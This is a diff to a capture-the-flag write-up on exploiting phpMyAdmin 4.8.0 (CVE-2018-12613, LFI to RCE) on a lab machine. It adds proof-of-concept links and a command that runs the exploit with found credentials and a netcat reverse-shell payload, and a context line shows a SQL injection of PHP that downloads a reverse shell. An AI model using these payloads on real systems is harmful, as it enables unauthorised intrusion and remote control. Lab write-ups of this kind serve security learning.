@@ -256,7 +256,7 @@ database management system users password hashes:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
 
 + The version of phpMyAdmin is 4.8.0, and check whether it has any exploits: `searchsploit phpMyAdmin 4.8`
-+ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) in this version. 
++ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) [3-PoC](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) in this version. 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4f986e6f-096f-4030-9912-23431041e16f)
 
@@ -292,6 +292,9 @@ select '<?php exec("wget -O /var/www/html/revshell.php http://10.10.14.8/revshel
 + See the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/12d48b82-8ec8-4d18-93a4-93d10aff2aa7)
+
++ **Alternatively**, try [Poc](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) to get a shell.
++ `python poc.py -u DBadmin -p imissyou -U http://10.10.10.143/phpmyadmin -P 'system("nc -e /bin/bash 10.10.14.88 4444");'`
 
 
 
@@ -487,6 +490,7 @@ WantedBy=multi-user.target
 # CVE Scripting
 + **CVE-2018-12613:** https://www.exploit-db.com/exploits/44928
 + https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
++ **PoC:** https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700
 
 
 # References & Alternatives
